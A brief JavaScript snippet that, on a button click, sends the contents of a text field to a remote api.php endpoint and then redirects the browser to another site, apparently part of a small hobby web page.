document.getElementById("submitButton").addEventListener("click", function() {
    var url = "http://tristanwiley.com/joey5802/tenessee/api.php?text=" + document.getElementById("howudoingman").value;
    fetch(url).then(data => data.text()).then(data => {
        window.location.href = "http://tnstatus.ga/";
    });
});
